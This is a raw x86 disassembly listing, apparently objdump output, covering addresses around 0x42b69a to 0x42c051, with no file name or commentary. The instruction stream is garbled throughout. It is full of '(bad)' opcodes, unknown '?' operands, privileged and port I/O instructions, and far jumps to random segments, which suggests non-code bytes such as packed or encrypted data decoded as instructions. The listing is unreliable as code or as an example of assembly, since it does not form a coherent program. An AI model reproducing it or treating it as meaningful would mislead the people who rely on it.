  42b69a:	and    BYTE PTR ss:[esi-0x6718fbd6],dh
  42b6a1:	std    
  42b6a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b6a3:	fwait
  42b6a4:	dec    ebx
  42b6a5:	lock pop eax
  42b6a7:	jmp    0x76af:0x4ab088f
  42b6ae:	scas   eax,DWORD PTR es:[edi]
  42b6af:	pop    esi
  42b6b0:	repz es push esp
  42b6b3:	add    esp,ebx
  42b6b5:	or     eax,0x9497db70
  42b6ba:	pushf  
  42b6bb:	lods   eax,DWORD PTR ds:[esi]
  42b6bc:	jge    0x42b691
  42b6be:	into   
  42b6bf:	lods   eax,DWORD PTR ds:[esi]
  42b6c0:	inc    bp
  42b6c2:	(bad)  [ecx]
  42b6c4:	mov    dl,0x41
  42b6c6:	scas   al,BYTE PTR es:[edi]
  42b6c7:	or     DWORD PTR [edx+0x1e4a8594],esi
  42b6cd:	cs fs push esp
  42b6d0:	repnz lahf 
  42b6d2:	lock adc bl,ch
  42b6d5:	in     al,0x2d
  42b6d7:	daa    
  42b6d8:	dec    edx
  42b6d9:	jae    0x42b6c7
  42b6db:	(bad)  
  42b6dc:	sub    ecx,DWORD PTR [ecx-0x22]
  42b6df:	xchg   esi,eax
  42b6e0:	rol    dh,0x8e
  42b6e3:	mov    ecx,esp
  42b6e5:	sbb    al,0xc6
  42b6e7:	inc    ebp
  42b6e8:	mov    ecx,0x38f240
  42b6ed:	call   0x9818:0x46009664
  42b6f4:	icebp  
  42b6f5:	push   0xffffffb0
  42b6f7:	std    
  42b6f8:	jge    0x42b765
  42b6fa:	test   DWORD PTR [edi-0x6d],eax
  42b6fd:	int    0xb
  42b6ff:	mov    edi,0xd0af2a1c
  42b704:	stos   DWORD PTR es:[edi],eax
  42b705:	test   al,0xbc
  42b707:	push   cs
  42b708:	jge    0x42b784
  42b70a:	popa   
  42b70b:	mov    esp,0x7c3f0646
  42b710:	jno    0x42b6bb
  42b712:	sub    eax,0xc417e4b4
  42b717:	add    eax,0x4488e4ff
  42b71c:	add    BYTE PTR gs:[ebp+0x730e703a],bl
  42b723:	jns    0x42b6a7
  42b725:	sub    BYTE PTR [edi-0x41],al
  42b728:	push   ebx
  42b729:	mov    esp,0x9c9653bd
  42b72e:	xchg   ebx,eax
  42b72f:	lock and ebx,DWORD PTR [eax+0x1d4ec18e]
  42b736:	push   ss
  42b737:	jge    0x42b77f
  42b739:	lock push edx
  42b73b:	lods   al,BYTE PTR ds:[esi]
  42b73c:	das    
  42b73d:	inc    ecx
  42b73e:	leave  
  42b73f:	cmp    DWORD PTR [ecx+eiz*2],eax
  42b742:	cmp    BYTE PTR [edi-0x24972aa9],bh
  42b748:	int3   
  42b749:	rcl    BYTE PTR [edx-0x21],0x1f
  42b74d:	xor    eax,0x185c48b4
  42b752:	inc    eax
  42b753:	retf   0xcdc7
  42b756:	shl    DWORD PTR [ebx],cl
  42b758:	add    eax,0xc66859e4
  42b75d:	ins    DWORD PTR es:[edi],dx
  42b75e:	test   DWORD PTR [bx+di],0xd78ad575
  42b765:	mov    al,0x3d
  42b767:	pop    esp
  42b768:	adc    dl,al
  42b76a:	cmp    eax,0x5dd8
	...
  42b7d3:	add    BYTE PTR [eax],al
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	or     ch,bl
  42b7e4:	mov    esi,0x1d16cb6
  42b7e9:	add    bh,bh
  42b7eb:	add    BYTE PTR [eax],al
  42b7ed:	add    BYTE PTR [eax+ebx*8+0x2a484101],bl
  42b7f4:	in     eax,dx
  42b7f5:	ins    BYTE PTR es:[edi],dx
  42b7f6:	aad    0xdc
  42b7f8:	int    0x64
  42b7fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b7fb:	push   esp
  42b7fc:	jb     0x42b802
  42b7fe:	sub    eax,0x52347e10
  42b803:	adc    esp,DWORD PTR [esi]
  42b805:	sbb    eax,0xb6d6dede
  42b80a:	out    0x7,eax
  42b80c:	push   esi
  42b80d:	aad    0x4
  42b80f:	push   0xffffffe8
  42b811:	dec    eax
  42b812:	fsub   st,st(0)
  42b814:	retf   0x4f34
  42b817:	sbb    ebx,eax
  42b819:	xor    ecx,DWORD PTR [edx-0x1a]
  42b81c:	mov    eax,ds:0xb8a96424
  42b821:	push   ds
  42b822:	push   ss
  42b823:	in     al,dx
  42b824:	retf   
  42b825:	es aaa 
  42b827:	push   0x3f8ba2f2
  42b82c:	pop    ss
  42b82d:	xbegin 0x5e884235
  42b833:	(bad)
  42b838:	pushf  
  42b839:	ss push edi
  42b83b:	cli    
  42b83c:	inc    esp
  42b83d:	mov    bh,0xe3
  42b83f:	outs   dx,DWORD PTR ds:[esi]
  42b840:	inc    esp
  42b841:	xor    BYTE PTR [eax+0x15a0613c],ch
  42b847:	div    ch
  42b849:	xor    DWORD PTR [ebx],0xbd644044
  42b84f:	adc    BYTE PTR [edi-0x4456386d],dh
  42b855:	gs jmp 0xbf730f19
  42b85b:	push   ss
  42b85c:	mov    ecx,0x3ac853ca
  42b862:	inc    esp
  42b863:	push   ds
  42b864:	enter  0x3fc,0x7b
  42b868:	clc    
  42b869:	ds adc ax,0xff8c
  42b86e:	xchg   esp,eax
  42b86f:	jecxz  0x42b8bc
  42b871:	xor    al,BYTE PTR ds:0x828f2fc1
  42b877:	icebp  
  42b878:	mov    ah,0x2e
  42b87a:	data16 mov al,0x1d
  42b87d:	adc    BYTE PTR [edx-0x21],bl
  42b880:	jmp    0x1a14:0x580ca418
  42b887:	push   ss
  42b888:	sti    
  42b889:	popf   
  42b88a:	push   edx
  42b88b:	sub    eax,0x32975585
  42b890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b891:	sub    al,0x8e
  42b893:	es hlt 
  42b895:	mov    WORD PTR [esp+edi*2+0xc],?
  42b899:	in     al,dx
  42b89a:	sub    eax,0x32675b61
  42b89f:	xor    DWORD PTR [eax-0x6f2294b2],0xffffffe3
  42b8a6:	adc    eax,ebp
  42b8a8:	rcl    DWORD PTR [eax+esi*8],0x36
  42b8ac:	jecxz  0x42b900
  42b8ae:	jg     0x42b8e0
  42b8b0:	mov    esi,0x5ba56842
  42b8b5:	lahf   
  42b8b6:	(bad)  
  42b8b7:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42b8b9:	and    DWORD PTR [eax],esi
  42b8bb:	sbb    BYTE PTR ds:0x43241173,cl
  42b8c1:	sub    BYTE PTR [eax+esi*1+0x5295a5bf],0xae
  42b8c9:	call   FWORD PTR [ecx]
  42b8cb:	loope  0x42b84d
  42b8cd:	mov    dh,0xc6
  42b8cf:	xchg   ebx,eax
  42b8d0:	adc    ebx,DWORD PTR [ebp+0x6eced623]
  42b8d6:	scas   eax,DWORD PTR es:[edi]
  42b8d7:	jae    0x42b860
  42b8d9:	les    ebx,FWORD PTR [ebp+eax*2+0x50ba954]
  42b8e0:	sbb    eax,DWORD PTR [edi]
  42b8e2:	daa    
  42b8e3:	jecxz  0x42b878
  42b8e5:	xchg   ebp,eax
  42b8e6:	mov    ds:0x32486f17,al
  42b8eb:	inc    ebx
  42b8ec:	sahf   
	...
  42b955:	add    al,ch
  42b957:	popf   
  42b958:	mov    esi,0xf9e7ffe7
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     eax,DWORD PTR [esi*4-0x2d946980]
  42b968:	add    DWORD PTR [eax],eax
  42b96a:	inc    DWORD PTR [eax]
  42b96c:	add    BYTE PTR [eax],al
  42b96e:	dec    ecx
  42b96f:	sbb    al,0x51
  42b971:	cs jecxz 0x42b958
  42b974:	inc    ecx
  42b975:	mov    ah,0x54
  42b977:	and    eax,0x5803d9ec
  42b97c:	int3   
  42b97d:	pop    edi
  42b97e:	jle    0x42b9c8
  42b980:	je     0x42b99d
  42b982:	cmc    
  42b983:	test   DWORD PTR [ecx],0xed5b975
  42b989:	or     DWORD PTR [ecx-0x306f8c3c],esp
  42b98f:	mov    BYTE PTR [edx-0x1e164ef0],ch
  42b995:	jecxz  0x42b927
  42b997:	bnd ja 0x42b956
  42b99a:	(bad)  
  42b99b:	xchg   ecx,eax
  42b99c:	aam    0xe7
  42b99e:	(bad)  
  42b99f:	(bad)  
  42b9a0:	into   
  42b9a1:	inc    ebp
  42b9a2:	dec    ebx
  42b9a3:	gs ds xor eax,0xd32a3cd6
  42b9aa:	ins    DWORD PTR es:[edi],dx
  42b9ab:	leave  
  42b9ac:	je     0x42b962
  42b9ae:	mov    al,0xf9
  42b9b0:	push   ecx
  42b9b1:	sbb    BYTE PTR [esi-0x18ee1ef6],ch
  42b9b7:	xchg   ebx,eax
  42b9b8:	add    eax,0x3a214162
  42b9bd:	inc    ebx
  42b9be:	xchg   ebx,eax
  42b9bf:	in     al,dx
  42b9c0:	add    DWORD PTR ds:[eax+ebx*4],0x7
  42b9c5:	outs   dx,BYTE PTR ds:[esi]
  42b9c6:	xchg   ecx,eax
  42b9c7:	addr16 retf 
  42b9c9:	adc    al,0x18
  42b9cb:	mov    ebx,0x26bead73
  42b9d0:	push   DWORD PTR [ebp+0x3e]
  42b9d3:	stc    
  42b9d4:	das    
  42b9d5:	outs   dx,BYTE PTR ds:[esi]
  42b9d6:	lods   al,BYTE PTR ds:[esi]
  42b9d7:	sbb    eax,DWORD PTR [ecx-0x41]
  42b9da:	aaa    
  42b9db:	int    0xbb
  42b9dd:	clc    
  42b9de:	pop    eax
  42b9df:	jmp    0x46da:0x59c8465b
  42b9e6:	sub    eax,0x13d7551d
  42b9eb:	push   edi
  42b9ec:	retf   
  42b9ed:	cmp    DWORD PTR [ebx-0x709f92fa],esi
  42b9f3:	lock (bad) 
  42b9f5:	mul    BYTE PTR [ecx]
  42b9f7:	popf   
  42b9f8:	es aas 
  42b9fa:	push   esi
  42b9fb:	int    0x61
  42b9fd:	les    ebx,FWORD PTR [edi+0x26]
  42ba00:	xor    DWORD PTR cs:[esi-0x144a299f],edx
  42ba07:	push   esi
  42ba08:	addr16 mov ds:0xa506,al
  42ba0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba0e:	sub    BYTE PTR [edx+0x14d3c2fb],al
  42ba14:	int3   
  42ba15:	call   0x31d65347
  42ba1a:	jno    0x42ba10
  42ba1c:	add    DWORD PTR [esi],0xffffffed
  42ba1f:	std    
  42ba20:	(bad)  
  42ba21:	outs   dx,DWORD PTR ds:[esi]
  42ba22:	mov    ch,0x61
  42ba24:	pushf  
  42ba25:	mov    bh,0x8f
  42ba27:	pop    ebx
  42ba28:	div    dh
  42ba2a:	cmp    bh,ah
  42ba2c:	je     0x42b9dc
  42ba2e:	daa    
  42ba2f:	nop
  42ba30:	adc    DWORD PTR [eax+0x7b],0xffffffe5
  42ba34:	lods   al,BYTE PTR ds:[esi]
  42ba35:	mov    esp,0xd2e4bdcb
  42ba3a:	mov    WORD PTR [ebx],?
  42ba3c:	(bad)  
  42ba3d:	lds    edx,FWORD PTR [eax+ebp*1]
  42ba40:	inc    ebp
  42ba41:	repz mov al,0xa9
  42ba44:	jp     0x42ba9a
  42ba46:	sti    
  42ba47:	mov    cl,0x8a
  42ba49:	adc    esp,edi
  42ba4b:	(bad)  
  42ba4c:	rol    bl,0xc7
  42ba4f:	adc    BYTE PTR [ebx-0x1b],dh
  42ba52:	int    0x86
  42ba54:	xchg   DWORD PTR [ebx+0x7e6d4d16],esi
  42ba5a:	test   al,0xb8
  42ba5c:	clc    
  42ba5d:	nop
  42ba5e:	test   DWORD PTR [edi-0x5],0xf7bf55be
  42ba65:	dec    eax
  42ba66:	or     bh,BYTE PTR [ebx-0x56]
  42ba69:	mov    esp,0xaf7ef6
	...
  42bad6:	mov    eax,DWORD PTR [edi]
  42bad8:	mov    al,0xe2
  42bada:	mov    esp,0x6a6fdbf7
  42badf:	pop    ebx
  42bae0:	xchg   ecx,eax
  42bae1:	or     edx,edx
  42bae3:	jmp    0x42bb50
  42bae5:	add    al,0x6a
  42bae7:	rol    DWORD PTR [ecx],cl
  42bae9:	add    bh,bh
  42baeb:	add    BYTE PTR [eax],al
  42baed:	add    BYTE PTR [edx-0x229ff006],bh
  42baf3:	cmp    eax,ecx
  42baf5:	jno    0x42babc
  42baf7:	dec    ebx
  42baf8:	popf   
  42baf9:	mov    ecx,0x814ce712
  42bafe:	xor    BYTE PTR [ebx],0x25
  42bb01:	xchg   edx,eax
  42bb02:	mov    bh,0x12
  42bb04:	mov    ds:0x80a0dbdb,al
  42bb09:	xchg   esi,eax
  42bb0a:	ret    
  42bb0b:	int    0x1c
  42bb0d:	popf   
  42bb0e:	stc    
  42bb0f:	or     dl,bh
  42bb11:	gs adc esi,0xffffff9b
  42bb15:	out    0x1c,al
  42bb17:	(bad)  
  42bb18:	shr    BYTE PTR [ebx],cl
  42bb1a:	pop    esi
  42bb1b:	(bad)  
  42bb1d:	pop    ebx
  42bb1e:	hlt    
  42bb1f:	ss mov cl,0xaf
  42bb22:	add    ecx,DWORD PTR [edi-0x31579332]
  42bb28:	shl    DWORD PTR [ecx-0x695549ae],1
  42bb2e:	add    edi,esi
  42bb30:	fsubp  st(1),st
  42bb32:	ret    
  42bb33:	or     edx,esi
  42bb35:	mov    eax,ds:0xdb30a737
  42bb3a:	inc    ebx
  42bb3b:	xchg   ebp,eax
  42bb3c:	inc    eax
  42bb3d:	das    
  42bb3e:	pop    ds
  42bb3f:	imul   eax,ebx,0x15b3c4b7
  42bb45:	pop    esi
  42bb46:	pop    es
  42bb47:	jle    0x42bb21
  42bb49:	and    dl,BYTE PTR [eax]
  42bb4b:	aam    0xa3
  42bb4d:	add    al,0x5
  42bb4f:	pop    ebp
  42bb50:	jp     0x42bb9e
  42bb52:	or     esp,DWORD PTR [esi+eax*8-0x7845739f]
  42bb59:	xor    DWORD PTR [edi],ebp
  42bb5b:	sar    BYTE PTR ds:0x945966f5,cl
  42bb61:	mov    al,ds:0xc4ae58ff
  42bb66:	inc    ecx
  42bb67:	xchg   DWORD PTR [ebp+0x45],ecx
  42bb6a:	sbb    al,0x2
  42bb6c:	lea    esi,[esi]
  42bb6e:	dec    ecx
  42bb6f:	or     ebp,esi
  42bb71:	inc    ecx
  42bb72:	jne    0x42bb80
  42bb74:	xchg   esi,eax
  42bb75:	cmp    eax,0xb251f3e2
  42bb7a:	iret   
  42bb7b:	fiadd  DWORD PTR [edx-0x64]
  42bb7e:	jp     0x42bbff
  42bb80:	fld    TBYTE PTR [ebx-0x26]
  42bb83:	in     eax,dx
  42bb84:	fcomp  QWORD PTR [ecx+0x2]
  42bb87:	push   eax
  42bb88:	sbb    edx,DWORD PTR [esi-0x77]
  42bb8b:	sahf   
  42bb8c:	mov    al,0x9
  42bb8e:	xchg   esi,eax
  42bb8f:	sub    al,0x93
  42bb91:	shl    esp,cl
  42bb93:	sahf   
  42bb94:	test   BYTE PTR [edx-0xbbe3815],dh
  42bb9a:	and    BYTE PTR [ebp*1+0x6435f8da],dh
  42bba1:	jbe    0x42bbde
  42bba3:	aas    
  42bba4:	push   cs
  42bba5:	sub    eax,0xdf148ef4
  42bbaa:	inc    esi
  42bbab:	fcomp  QWORD PTR ds:0xf050a1f4
  42bbb1:	call   0x96be38ff
  42bbb6:	xor    cl,0x4d
  42bbb9:	(bad)  
  42bbba:	sbb    ecx,DWORD PTR [ebx-0x65]
  42bbbd:	ret    0x232d
  42bbc0:	ja     0x42bb51
  42bbc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbc3:	add    al,0xca
  42bbc5:	fistp  QWORD PTR [esi+0xf56dacf]
  42bbcb:	cs jg  0x42bc07
  42bbce:	(bad)  
  42bbcf:	mov    ebp,0xd9f88593
  42bbd4:	cmp    eax,0x6a4400a4
  42bbd9:	or     DWORD PTR [edi+0x39],esp
  42bbdc:	inc    edx
  42bbdd:	mov    bh,0x58
  42bbdf:	rcr    ebx,0xb9
  42bbe2:	lods   al,BYTE PTR ds:[esi]
  42bbe3:	daa    
  42bbe4:	fist   DWORD PTR [ecx+0x7d291fb2]
  42bbea:	add    edx,ebx
  42bbec:	jg     0x42bbee
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	push   eax
  42bc63:	test   BYTE PTR [ecx],0xbd
  42bc66:	imul   edx,esp,0xff0001
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	loop   0x42bc2f
  42bc70:	mul    DWORD PTR [eax+0x3360f54f]
  42bc76:	jmp    0xa5b1:0x68a98ae3
  42bc7d:	add    dh,BYTE PTR ds:0xfa7157d1
  42bc83:	push   esi
  42bc84:	jb     0x42bcb6
  42bc86:	loope  0x42bcf6
  42bc88:	mov    BYTE PTR [esi],0x38
  42bc8b:	pop    edi
  42bc8c:	add    cl,0x4
  42bc8f:	stc    
  42bc90:	and    al,0xcb
  42bc92:	mov    eax,ds:0x6e1b0ef9
  42bc97:	adc    DWORD PTR [edi],edi
  42bc99:	lods   al,BYTE PTR ds:[esi]
  42bc9a:	loopne 0x42bd12
  42bc9c:	ret    0x60c1
  42bc9f:	fistp  DWORD PTR [ebx+ebx*1-0x6751020a]
  42bca6:	mov    ?,WORD PTR [esi-0x22]
  42bca9:	mov    edx,?
  42bcab:	pop    ecx
  42bcac:	adc    ah,BYTE PTR [ebx-0x1a3bd4]
  42bcb2:	pushf  
  42bcb3:	loope  0x42bcc4
  42bcb5:	out    dx,al
  42bcb6:	pop    ecx
  42bcb7:	xor    ch,bl
  42bcb9:	xchg   ebp,eax
  42bcba:	(bad)  
  42bcbb:	repz inc edi
  42bcbd:	retf   0x871
  42bcc0:	sbb    eax,0x1e777495
  42bcc5:	add    BYTE PTR ds:0x6e3857fc,ch
  42bccb:	out    dx,eax
  42bccc:	leave  
  42bccd:	fbld   TBYTE PTR [ebx]
  42bccf:	gs jo  0x42bd0a
  42bcd2:	lock (bad) 
  42bcd5:	cld    
  42bcd6:	mov    al,0x4b
  42bcd8:	nop
  42bcd9:	int    0x6d
  42bcdb:	jno    0x42bc75
  42bcdd:	cmp    eax,0x7fe7e4a9
  42bce2:	mov    esp,ds
  42bce4:	cwde   
  42bce5:	push   es
  42bce6:	xchg   edi,eax
  42bce7:	pop    edx
  42bce8:	pop    esi
  42bce9:	sbb    ecx,DWORD PTR [ecx+0x2b]
  42bcec:	les    ecx,FWORD PTR [ebx+0x3a]
  42bcef:	cmp    al,0x23
  42bcf1:	mov    WORD PTR [ecx],?
  42bcf3:	and    ecx,DWORD PTR [edi-0x9]
  42bcf6:	outs   dx,BYTE PTR ds:[esi]
  42bcf7:	xchg   ecx,eax
  42bcf8:	mov    dl,0xe4
  42bcfa:	cli    
  42bcfb:	test   DWORD PTR [esi],ebp
  42bcfd:	dec    edi
  42bcfe:	fist   DWORD PTR [ebp-0x53871ba7]
  42bd04:	adc    dl,bl
  42bd06:	sub    esp,DWORD PTR [edx]
  42bd08:	sbb    ebx,0xa6c143e9
  42bd0e:	sbb    DWORD PTR [edi],esp
  42bd10:	push   esp
  42bd11:	shr    ebp,1
  42bd13:	in     eax,0x67
  42bd15:	loop   0x42bd65
  42bd17:	cmp    al,0x5a
  42bd19:	into   
  42bd1a:	das    
  42bd1b:	test   DWORD PTR [eax-0x4d],esp
  42bd1e:	test   DWORD PTR [eax+0x3a],esp
  42bd21:	mov    cl,0x6f
  42bd23:	mov    ss,ebp
  42bd25:	enter  0x55d1,0x8f
  42bd29:	xor    DWORD PTR [esi-0x57d7c9a4],edx
  42bd2f:	adc    ebx,DWORD PTR [esi+0x25c9e812]
  42bd35:	stc    
  42bd36:	mov    ds:0x166569aa,eax
  42bd3b:	inc    edi
  42bd3c:	sar    BYTE PTR [eax+0x1abd701e],1
  42bd42:	imul   ebp,DWORD PTR [ebx],0xfffffff3
  42bd45:	xor    BYTE PTR [ebp-0x608fcc21],cl
  42bd4b:	test   BYTE PTR [esi+0x5e],bl
  42bd4e:	fmul   DWORD PTR [edi]
  42bd50:	xchg   ebp,ecx
  42bd52:	or     DWORD PTR [eax],eax
  42bd54:	push   ebx
  42bd55:	sbb    BYTE PTR [edi-0x71],cl
  42bd58:	jne    0x42bd4e
  42bd5a:	sar    bh,0x98
  42bd5d:	dec    ebx
  42bd5e:	pop    ds
  42bd5f:	gs call 0x33e7e742
  42bd65:	mov    ch,0xd5
  42bd67:	push   edx
  42bd68:	out    0x2a,al
  42bd6a:	mov    esp,0xf1a1
	...
  42bdd3:	add    BYTE PTR [eax],al
  42bdd5:	add    BYTE PTR [eax-0x61eb634a],dh
  42bddb:	ds mov eax,0xffec3b6
  42bde1:	jae    0x42bd93
  42bde3:	bound  ecx,QWORD PTR [esi]
  42bde5:	repnz push 0xff0001d5
  42bdeb:	add    BYTE PTR [eax],al
  42bded:	add    BYTE PTR [edi-0x2a],bh
  42bdf0:	outs   dx,DWORD PTR ds:[esi]
  42bdf1:	ret    0x97fa
  42bdf4:	inc    esp
  42bdf5:	jmp    FWORD PTR [ecx+edx*1-0x3b]
  42bdf9:	sbb    bh,bl
  42bdfb:	push   cs
  42bdfc:	mov    ecx,0xe2a422dd
  42be01:	sub    al,0xe6
  42be03:	inc    edx
  42be04:	mov    ds:0x90b77466,al
  42be09:	dec    ebp
  42be0a:	pop    esi
  42be0b:	cmp    ecx,ecx
  42be0d:	and    DWORD PTR [edx],ebp
  42be0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be10:	fdiv   DWORD PTR [edx+0x42]
  42be13:	out    0x23,eax
  42be15:	fcomi  st,st(1)
  42be17:	and    bl,BYTE PTR [ecx-0x26]
  42be1a:	stos   BYTE PTR es:[edi],al
  42be1b:	fbstp  TBYTE PTR [esi+0x750dcace]
  42be21:	(bad)  [ecx]
  42be23:	loop   0x42be53
  42be25:	xchg   ecx,eax
  42be26:	into   
  42be27:	fldenv [edi-0x2f]
  42be2a:	pop    edx
  42be2b:	popa   
  42be2c:	sbb    dh,BYTE PTR [edi+0x21]
  42be2f:	cmp    ch,0x62
  42be32:	jne    0x42bdef
  42be34:	call   0xd119e810
  42be39:	and    BYTE PTR [eax-0x7031045f],dh
  42be3f:	imul   ebx,DWORD PTR [ebx-0x24],0xffffffcc
  42be43:	cdq    
  42be44:	and    cl,BYTE PTR [eax-0x17b24148]
  42be4a:	jecxz  0x42be22
  42be4c:	cmp    ebp,DWORD PTR [eax-0x73]
  42be4f:	pop    ecx
  42be50:	push   ecx
  42be51:	retf   
  42be52:	or     DWORD PTR [edi+0x11],edx
  42be55:	scas   al,BYTE PTR es:[edi]
  42be56:	mov    ds:0x76be321,eax
  42be5b:	dec    eax
  42be5c:	dec    ecx
  42be5d:	xchg   edx,eax
  42be5e:	pop    esp
  42be5f:	xchg   esi,eax
  42be60:	dec    esi
  42be61:	cs loopne 0x42be9f
  42be64:	xor    DWORD PTR [esi+ecx*2],ebp
  42be67:	das    
  42be68:	dec    eax
  42be69:	fs push esp
  42be6b:	ss pop edx
  42be6d:	lds    ebp,FWORD PTR [ebx]
  42be6f:	loop   0x42be35
  42be71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42be72:	gs lock int 0x1d
  42be76:	xchg   esp,eax
  42be77:	pop    eax
  42be78:	dec    esi
  42be79:	mul    DWORD PTR [esi+0x5d75db13]
  42be7f:	sbb    eax,0x972dc064
  42be84:	fstp   TBYTE PTR [ebx-0x4f6e9996]
  42be8a:	(bad)  
  42be8b:	(bad)  
  42be8c:	(bad)  
  42be8e:	push   edi
  42be8f:	ret    0xf59f
  42be92:	lods   al,BYTE PTR ds:[esi]
  42be93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be94:	pusha  
  42be95:	je     0x42bef5
  42be97:	sbb    DWORD PTR [ebp-0x61],0x89fef7
  42be9e:	push   esi
  42be9f:	cmp    edi,ecx
  42bea1:	and    eax,0xdc0ef1e8
  42bea6:	push   ecx
  42bea7:	mov    edi,0x5f49ff4
  42beac:	cmp    ecx,0x86ab5b9c
  42beb2:	sysret 
  42beb4:	mov    edx,DWORD PTR [ecx+0x120aabf8]
  42beba:	sahf   
  42bebb:	xchg   esi,eax
  42bebc:	test   al,0x3e
  42bebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bebf:	inc    esp
  42bec0:	inc    ebx
  42bec1:	lods   eax,DWORD PTR ds:[esi]
  42bec2:	or     edx,DWORD PTR [esi]
  42bec4:	or     al,0xa
  42bec6:	das    
  42bec7:	outs   dx,DWORD PTR ds:[esi]
  42bec8:	aam    0x83
  42beca:	mov    cl,0x5f
  42becc:	inc    edi
  42becd:	or     al,0x14
  42becf:	inc    eax
  42bed0:	xor    al,0xb9
  42bed2:	dec    ecx
  42bed3:	push   cs
  42bed4:	mov    ebp,0xf21d3e06
  42bed9:	loop   0x42be97
  42bedb:	pushf  
  42bedc:	dec    edx
  42bedd:	or     al,0xfd
  42bedf:	imul   esp,esi,0x6
  42bee2:	sbb    ebp,eax
  42bee4:	clc    
  42bee5:	jnp    0x42be8a
  42bee7:	into   
  42bee8:	inc    esp
  42bee9:	addr16 retf 
  42beeb:	mov    ah,0xae
	...
  42bf55:	add    BYTE PTR [edi-0x825b8e0],dl
  42bf5b:	call   FWORD PTR [edi-0x28375c93]
  42bf61:	jnp    0x42bef6
  42bf63:	mov    WORD PTR [esi],ss
  42bf65:	(bad)  
  42bf66:	addr16 (bad) 
  42bf68:	add    DWORD PTR [eax],eax
  42bf6a:	inc    DWORD PTR [eax]
  42bf6c:	add    BYTE PTR [eax],al
  42bf6e:	mov    ds:0x5f35f2ac,al
  42bf73:	cmp    DWORD PTR [esi],esp
  42bf75:	js     0x42bfb7
  42bf77:	jae    0x42bf46
  42bf79:	inc    edx
  42bf7a:	aaa    
  42bf7b:	pop    ecx
  42bf7c:	pop    edx
  42bf7d:	inc    ebx
  42bf7e:	push   esi
  42bf7f:	pop    ss
  42bf80:	test   al,0x22
  42bf82:	jmp    0x47ecea33
  42bf87:	stos   BYTE PTR es:[edi],al
  42bf88:	mov    cl,0xa5
  42bf8a:	mov    ah,0x70
  42bf8c:	cmc    
  42bf8d:	shr    BYTE PTR [eax-0x7a],0xc5
  42bf91:	mov    al,0xac
  42bf93:	mov    esp,0xce8c64b
  42bf98:	mov    bh,0x11
  42bf9a:	pop    edx
  42bf9b:	jge    0x42c017
  42bf9d:	cs push ebx
  42bf9f:	jae    0x42bf23
  42bfa1:	or     esp,DWORD PTR [edi-0x57]
  42bfa4:	repz jg 0x42bf31
  42bfa7:	inc    eax
  42bfa8:	out    0xb7,al
  42bfaa:	push   ss
  42bfab:	sbb    edi,ecx
  42bfad:	push   0xffffff84
  42bfaf:	rol    BYTE PTR [esi+0x4f],0x55
  42bfb3:	adc    eax,0x69c5ec4a
  42bfb8:	(bad)  
  42bfb9:	rol    DWORD PTR [esi+0x7f49fc7a],1
  42bfbf:	xor    al,0x44
  42bfc1:	xlat   BYTE PTR ds:[ebx]
  42bfc2:	inc    ecx
  42bfc3:	pop    eax
  42bfc4:	dec    esi
  42bfc5:	fwait
  42bfc6:	je     0x42bfc9
  42bfc8:	lahf   
  42bfc9:	popf   
  42bfca:	inc    ebx
  42bfcb:	cmp    eax,0x81ee995d
  42bfd0:	dec    edi
  42bfd1:	mov    edx,0x8ebd6336
  42bfd6:	push   0xffffffcb
  42bfd8:	fucomp st(5)
  42bfda:	nop
  42bfdb:	push   ds
  42bfdc:	inc    ebx
  42bfdd:	mov    BYTE PTR [ebp+0x575e92ee],bl
  42bfe3:	nop
  42bfe4:	cmp    cl,cl
  42bfe6:	addr16 or ah,al
  42bfe9:	out    0xbe,eax
  42bfeb:	ror    BYTE PTR [esi+eiz*1+0x49ce1cef],cl
  42bff2:	mov    cl,0xae
  42bff4:	pusha  
  42bff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bff6:	into   
  42bff7:	es lahf 
  42bff9:	popa   
  42bffa:	add    al,0x2f
  42bffc:	pop    ebx
  42bffd:	and    BYTE PTR [edx-0x20],0xc4
  42c001:	sub    dh,ah
  42c003:	xor    bh,ah
  42c005:	enter  0x7c0e,0x31
  42c009:	scas   eax,DWORD PTR es:[edi]
  42c00a:	icebp  
  42c00b:	pop    edx
  42c00c:	mov    eax,ds:0x9814c748
  42c011:	ins    BYTE PTR es:[edi],dx
  42c012:	mov    BYTE PTR [edi+ecx*4],cl
  42c015:	in     al,dx
  42c016:	xchg   edi,eax
  42c017:	mov    bh,0x96
  42c019:	xlat   BYTE PTR ds:[ebx]
  42c01a:	enter  0x78b8,0xb9
  42c01e:	ds es nop
  42c021:	je     0x42bfed
  42c023:	mov    eax,ds:0x971d8771
  42c028:	ja     0x42c081
  42c02a:	jl     0x42c061
  42c02c:	(bad)  
  42c02e:	jp     0x42c019
  42c030:	sbb    BYTE PTR [edi+0x5],0x2c
  42c034:	push   esi
  42c035:	(bad)  
  42c036:	mul    DWORD PTR [edx]
  42c038:	jp     0x42c04d
  42c03a:	mov    ah,0x56
  42c03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c03d:	jnp    0x42c097
  42c03f:	pmaddwd mm5,QWORD PTR [eax-0x38]
  42c043:	mov    esi,0x6753062c
  42c048:	mov    bh,dl
  42c04a:	push   esi
  42c04b:	inc    dh
  42c04d:	push   es
  42c04e:	or     bl,BYTE PTR [edx+0x19]
  42c051:	pop    ebx
